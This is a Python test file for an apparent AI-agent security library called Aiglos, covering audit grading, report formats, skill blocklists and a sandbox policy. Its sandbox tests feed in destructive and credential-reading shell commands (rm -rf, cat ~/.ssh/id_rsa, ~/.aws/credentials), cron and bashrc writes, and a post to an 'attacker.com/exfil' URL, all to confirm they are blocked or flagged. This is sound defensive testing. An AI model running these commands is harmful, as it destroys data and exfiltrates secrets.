"""
tests/test_audit_and_sandbox.py
================================
Aiglos v0.18.0 -- Audit, Skill Reputation, Sandbox Policy

Tests cover:
  - AuditScanner: all 5 phases, scoring, grade calculation
  - AuditResult: grade, counts, findings
  - AuditReporter: summary, full, JSON, briefing, clawkeeper formats
  - SkillReputationGraph: badge ingestion, get_skill_risk, blocked/suspicious lists
  - SandboxPolicy: filesystem escapes, shell escapes, HTTP escapes, env access
  - SANDBOX_ESCAPE_ATTEMPT campaign pattern exists
  - Module API: v0.18.0, exports
"""

import os
import sys
import time
import json
import tempfile

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import aiglos
from aiglos.audit.scanner import AuditScanner, AuditResult, CheckResult, _grade
from aiglos.audit.report  import AuditReporter
from aiglos.adaptive.skill_reputation import SkillReputationGraph, SkillRisk
from aiglos.integrations.sandbox_policy import SandboxPolicy, SandboxCheckResult
from aiglos.adaptive.observation import ObservationGraph


# =============================================================================
# Helpers
# =============================================================================

def _make_graph(tmp_path) -> ObservationGraph:
    return ObservationGraph(db_path=str(tmp_path / "obs.db"))


def _make_result(score=85, deep=False) -> AuditResult:
    checks = [
        CheckResult("P1-01", 1, "No .env files", "PASS", ""),
        CheckResult("P1-SEC", 1, "Secret in .env", "CRITICAL", "API key found"),
        CheckResult("P3-01", 3, "tools.elevated enabled", "WARN", "Elevated tools on"),
    ]
    return AuditResult(
        score=score, grade=_grade(score),
        checks=checks, aiglos_version="0.18.0", deep=deep,
    )


# =============================================================================
# Grade calculation
# =============================================================================

class TestGradeCalculation:

    def test_100_is_a(self):    assert _grade(100) == "A"
    def test_90_is_a(self):     assert _grade(90)  == "A"
    def test_89_is_b(self):     assert _grade(89)  == "B"
    def test_75_is_b(self):     assert _grade(75)  == "B"
    def test_74_is_c(self):     assert _grade(74)  == "C"
    def test_60_is_c(self):     assert _grade(60)  == "C"
    def test_59_is_d(self):     assert _grade(59)  == "D"
    def test_45_is_d(self):     assert _grade(45)  == "D"
    def test_44_is_f(self):     assert _grade(44)  == "F"
    def test_0_is_f(self):      assert _grade(0)   == "F"


# =============================================================================
# AuditResult
# =============================================================================

class TestAuditResult:

    def test_grade_from_score(self):
        r = AuditResult(score=92, grade="A", aiglos_version="0.18.0")
        assert r.grade == "A"

    def test_critical_count(self):
        r = _make_result()
        assert r.critical_count == 1

    def test_warn_count(self):
        r = _make_result()
        assert r.warn_count == 1

    def test_pass_count(self):
        r = _make_result()
        assert r.pass_count == 1

    def test_findings_excludes_pass(self):
        r = _make_result()
        for f in r.findings:
            assert f.severity != "PASS"

    def test_findings_sorted_critical_first(self):
        r = _make_result()
        severities = [f.severity for f in r.findings]
        order = {"CRITICAL": 0, "FAIL": 1, "WARN": 2}
        for i in range(len(severities) - 1):
            assert order.get(severities[i], 9) <= order.get(severities[i+1], 9)


# =============================================================================
# AuditScanner
# =============================================================================

class TestAuditScanner:

    def test_run_returns_audit_result(self, tmp_path):
        scanner = AuditScanner(deep=False)
        result  = scanner.run()
        assert isinstance(result, AuditResult)
        assert 0 <= result.score <= 100
        assert result.grade in "ABCDF"

    def test_score_starts_at_100(self, tmp_path):
        scanner = AuditScanner(deep=False)
        result  = scanner.run()
        # Score should be <= 100 (deductions applied)
        assert result.score <= 100

    def test_checks_produced(self, tmp_path):
        scanner = AuditScanner(deep=False)
        result  = scanner.run()
        assert len(result.checks) > 0

    def test_all_phases_run(self, tmp_path):
        scanner = AuditScanner(deep=False)
        result  = scanner.run()
        phases  = set(c.phase for c in result.checks)
        # All 5 phases should have at least one check
        assert len(phases) >= 3

    def test_deep_scan_adds_more_checks(self, tmp_path):
        r_normal = AuditScanner(deep=False).run()
        r_deep   = AuditScanner(deep=True).run()
        assert len(r_deep.checks) >= len(r_normal.checks)

    def test_deep_flag_set_in_result(self, tmp_path):
        r = AuditScanner(deep=True).run()
        assert r.deep is True

    def test_aiglos_version_populated(self, tmp_path):
        r = AuditScanner(deep=False).run()
        assert r.aiglos_version == aiglos.__version__

    def test_duration_ms_positive(self, tmp_path):
        r = AuditScanner(deep=False).run()
        assert r.duration_ms > 0


# =============================================================================
# AuditReporter
# =============================================================================

class TestAuditReporter:

    def test_summary_contains_grade(self):
        r        = _make_result(score=85)
        reporter = AuditReporter(r)
        summary  = reporter.summary()
        assert "B" in summary

    def test_summary_contains_version(self):
        r        = _make_result()
        reporter = AuditReporter(r)
        assert "0.18.0" in reporter.summary()

    def test_full_report_contains_phases(self):
        r        = _make_result()
        reporter = AuditReporter(r)
        full     = reporter.full()
        assert "Phase" in full or "Secret" in full

    def test_json_is_valid(self):
        r        = _make_result()
        reporter = AuditReporter(r)
        data     = json.loads(reporter.to_json())
        assert data["score"] == r.score
        assert data["grade"] == r.grade
        assert "checks" in data

    def test_briefing_contains_date(self):
        r        = _make_result()
        reporter = AuditReporter(r)
        briefing = reporter.briefing()
        import datetime
        year = str(datetime.datetime.now().year)
        assert year in briefing

    def test_clawkeeper_json_has_combined_grade(self):
        r        = _make_result(score=80)
        reporter = AuditReporter(r)
        data     = json.loads(reporter.to_clawkeeper_json())
        assert "combined_grade" in data
        assert "aiglos_runtime" in data

    def test_clawkeeper_json_merges_host_data(self):
        r        = _make_result(score=85)
        reporter = AuditReporter(r)
        ck_data  = {"grade": "A", "score": 98, "checks": 42}
        data     = json.loads(reporter.to_clawkeeper_json(ck_data))
        assert data["aiglos_runtime"]["grade"] == "B"
        assert "host_audit" not in data   # merged directly

    def test_save_creates_file(self, tmp_path):
        r        = _make_result()
        reporter = AuditReporter(r)
        path     = reporter.save(output_dir=tmp_path)
        assert path.exists()


# =============================================================================
# SkillReputationGraph
# =============================================================================

class TestSkillReputationGraph:

    def test_get_skill_risk_unknown_returns_clean(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        risk  = srg.get_skill_risk("unknown-skill-xyz")
        assert risk.level == "CLEAN"

    def test_ingest_blocked_skill(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        srg.ingest_badge_list([
            {"name": "evil-skill", "badge": "Blocked"},
        ])
        risk = srg.get_skill_risk("evil-skill")
        assert risk.should_block is True
        assert risk.badge == "Blocked"

    def test_ingest_suspicious_skill(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        srg.ingest_badge_list([{"name": "sketchy-skill", "badge": "Suspicious"}])
        risk = srg.get_skill_risk("sketchy-skill")
        assert risk.should_warn is True

    def test_ingest_clean_skill_not_stored(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        count = srg.ingest_badge_list([{"name": "clean-skill", "badge": "Clean"}])
        assert count == 0

    def test_blocked_skills_list(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        srg.ingest_badge_list([
            {"name": "bad-skill-1", "badge": "Blocked"},
            {"name": "bad-skill-2", "badge": "Blocked"},
            {"name": "ok-skill",    "badge": "Clean"},
        ])
        blocked = srg.blocked_skills()
        assert "bad-skill-1" in blocked
        assert "bad-skill-2" in blocked
        assert "ok-skill"    not in blocked

    def test_suspicious_skills_list(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        srg.ingest_badge_list([{"name": "iffy-skill", "badge": "Suspicious"}])
        suspicious = srg.suspicious_skills()
        assert "iffy-skill" in suspicious

    def test_ingest_clawkeeper_audit_format(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        audit_data = {
            "skills": [
                {"name": "bad-mcp-skill", "badge": "Blocked"},
                {"name": "warn-skill",    "badge": "Suspicious"},
            ]
        }
        count = srg.ingest_clawkeeper_audit(audit_data)
        assert count == 2

    def test_shareable_excludes_clean_skills(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        srg.ingest_badge_list([
            {"name": "bad",  "badge": "Blocked"},
            {"name": "good", "badge": "Clean"},
        ])
        shareable = srg.get_shareable_skill_reputation()
        names = [s["skill"] for s in shareable]
        assert "bad"  in names
        assert "good" not in names

    def test_case_insensitive_skill_name(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        srg.ingest_badge_list([{"name": "Bad-Skill", "badge": "Blocked"}])
        risk = srg.get_skill_risk("bad-skill")
        assert risk.should_block is True

    def test_network_error_returns_zero_not_raise(self, tmp_path):
        graph = _make_graph(tmp_path)
        srg   = SkillReputationGraph(graph=graph)
        # Feed sync should fail gracefully when network unreachable
        count = srg.sync_security_feed()
        assert isinstance(count, int)


# =============================================================================
# SandboxPolicy
# =============================================================================

class TestSandboxPolicy:

    def test_non_sandbox_mode_allows_everything(self):
        policy = SandboxPolicy(mode="main")
        result = policy.check("shell.execute", {"command": "rm -rf /"})
        assert result.verdict == "ALLOW"

    def test_shell_rm_rf_blocked_in_non_main(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        result = policy.check("shell.execute", {"command": "rm -rf /var"})
        assert result.verdict == "BLOCK"
        assert result.tier    == 3
        assert result.is_escape is True

    def test_sudo_blocked(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        result = policy.check("shell.run", {"command": "sudo cat /etc/passwd"})
        assert result.verdict == "BLOCK"

    def test_cat_credentials_blocked(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        result = policy.check("shell.execute",
                               {"command": "cat ~/.aws/credentials"})
        assert result.verdict == "BLOCK"

    def test_filesystem_absolute_path_blocked(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        result = policy.check("filesystem.write_file",
                               {"path": "/etc/cron.d/evil"})
        assert result.verdict == "BLOCK"

    def test_filesystem_home_path_blocked(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        result = policy.check("filesystem.write_file",
                               {"path": "~/.bashrc"})
        assert result.verdict == "BLOCK"

    def test_working_dir_write_allowed(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        result = policy.check("filesystem.write_file",
                               {"path": str(tmp_path / "output.txt")})
        assert result.verdict == "ALLOW"

    def test_env_access_blocked(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        result = policy.check("env.get", {"key": "AWS_SECRET"})
        assert result.verdict == "BLOCK"
        assert result.tier    == 3

    def test_http_non_allowlisted_warns(self, tmp_path):
        policy = SandboxPolicy(
            mode="non-main",
            working_dir=str(tmp_path),
            allow_http=["api.openai.com"],
        )
        result = policy.check("http.post",
                               {"url": "https://attacker.com/exfil"})
        assert result.verdict == "WARN"

    def test_http_allowlisted_passes(self, tmp_path):
        policy = SandboxPolicy(
            mode="non-main",
            working_dir=str(tmp_path),
            allow_http=["api.openai.com"],
        )
        result = policy.check("http.post",
                               {"url": "https://api.openai.com/v1/chat"})
        assert result.verdict == "ALLOW"

    def test_escape_campaign_detection(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        for _ in range(3):
            policy.check("shell.execute", {"command": "cat ~/.ssh/id_rsa"})
        assert policy.is_escape_campaign() is True

    def test_escape_count(self, tmp_path):
        policy = SandboxPolicy(mode="non-main", working_dir=str(tmp_path))
        policy.check("shell.execute", {"command": "sudo cat /etc/passwd"})
        policy.check("filesystem.write_file", {"path": "/etc/cron.d/x"})
        assert policy.escape_count == 2


# =============================================================================
# SANDBOX_ESCAPE_ATTEMPT campaign pattern
# =============================================================================

class TestSandboxCampaignPattern:

    def test_sandbox_escape_attempt_in_patterns(self):
        from aiglos.adaptive.campaign import _CAMPAIGN_PATTERNS
        names = [p["name"] for p in _CAMPAIGN_PATTERNS]
        assert "SANDBOX_ESCAPE_ATTEMPT" in names

    def test_sandbox_escape_attempt_confidence(self):
        from aiglos.adaptive.campaign import _CAMPAIGN_PATTERNS
        p = next(x for x in _CAMPAIGN_PATTERNS
                 if x["name"] == "SANDBOX_ESCAPE_ATTEMPT")
        assert p["confidence"] >= 0.80

    def test_sandbox_escape_attempt_min_events(self):
        from aiglos.adaptive.campaign import _CAMPAIGN_PATTERNS
        p = next(x for x in _CAMPAIGN_PATTERNS
                 if x["name"] == "SANDBOX_ESCAPE_ATTEMPT")
        assert p["min_events"] >= 3


# =============================================================================
# Module API
# =============================================================================

class TestV0180ModuleAPI:

    def test_version_is_0180(self):
        assert aiglos.__version__ == "0.25.22"

    def test_audit_scanner_in_all(self):
        assert "AuditScanner" in aiglos.__all__

    def test_audit_result_in_all(self):
        assert "AuditResult" in aiglos.__all__

    def test_audit_reporter_in_all(self):
        assert "AuditReporter" in aiglos.__all__

    def test_skill_reputation_graph_in_all(self):
        assert "SkillReputationGraph" in aiglos.__all__

    def test_sandbox_policy_in_all(self):
        assert "SandboxPolicy" in aiglos.__all__

    def test_all_exports_importable(self):
        missing = [e for e in aiglos.__all__ if not hasattr(aiglos, e)]
        assert missing == [], f"Missing exports: {missing}"

    def test_audit_scanner_runs(self):
        scanner = aiglos.AuditScanner(deep=False)
        result  = scanner.run()
        assert isinstance(result, aiglos.AuditResult)
